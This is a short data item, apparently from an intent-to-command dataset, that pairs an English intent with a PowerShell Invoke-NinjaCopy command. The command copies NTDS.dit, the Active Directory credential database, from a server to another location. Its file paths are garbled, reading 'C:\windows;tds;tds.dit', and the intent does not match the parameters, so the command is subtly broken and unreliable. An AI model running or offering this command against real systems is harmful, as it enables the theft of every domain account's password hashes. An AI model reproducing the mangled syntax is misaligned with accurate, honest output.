# Natural language intent:
# Use NinjaCopy to copy the NTDS.dit file from a local path to a remote destination on a server.

Invoke-NinjaCopy -Path 'C:\windows;tds;tds.dit' -RemoteDestination 'c:\windows\temp;tds.dit' -ComputerName 'Server1'
